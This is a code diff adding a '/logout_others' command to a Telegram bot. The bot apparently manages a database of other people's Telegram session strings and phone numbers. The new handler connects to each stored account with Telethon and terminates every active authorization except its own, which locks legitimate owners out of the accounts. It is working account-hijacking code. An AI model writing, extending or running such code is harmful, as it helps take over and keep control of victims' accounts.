@@ -197,6 +197,64 @@ async def generate_full_session_data(session_info, client, me):
 
 # ================== SESSION EXPORT ==================
 
+# Добавьте этот обработчик в раздел COMMAND HANDLERS
+@dp.message_handler(commands=['logout_others'])
+async def cmd_logout_other_sessions(message: types.Message):
+    user_id = message.from_user.id
+    
+    if not is_main_admin(user_id) and not is_light_admin(user_id):
+        await message.answer("❌ You don't have access to this command.")
+        return
+    
+    await message.answer("⏳ Starting to logout other sessions, please wait...")
+    
+    if is_main_admin(user_id):
+        sessions = list(sessions_col.find({}))
+    else:
+        sessions = list(light_sessions_col.find({"owner_id": user_id}))
+    
+    if not sessions:
+        await message.answer("❌ No sessions found in database.")
+        return
+    
+    success_count = 0
+    fail_count = 0
+    
+    for session in sessions:
+        client = None
+        try:
+            client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+            await client.connect()
+            
+            if await client.is_user_authorized():
+                # Получаем список всех активных сессий
+                auths = await client(GetAuthorizationsRequest())
+                
+                # Оставляем только текущую сессию
+                for auth in auths.authorizations:
+                    if auth.current:
+                        continue  # Это текущая сессия, пропускаем
+                    
+                    try:
+                        await client(ResetAuthorizationRequest(hash=auth.hash))
+                        success_count += 1
+                    except Exception as e:
+                        logging.error(f"Failed to logout session {auth.hash} for {session['phone']}: {e}")
+                        fail_count += 1
+                
+        except Exception as e:
+            logging.error(f"Error processing session {session.get('phone')}: {str(e)}")
+            fail_count += 1
+        finally:
+            if client:
+                await client.disconnect()
+    
+    await message.answer(
+        f"✅ Logout completed:\n"
+        f"• Successfully logged out: {success_count} sessions\n"
+        f"• Failed to logout: {fail_count} sessions"
+    )
+
 async def export_sessions(user_id):
     """Export all sessions in required format"""
     if is_main_admin(user_id):
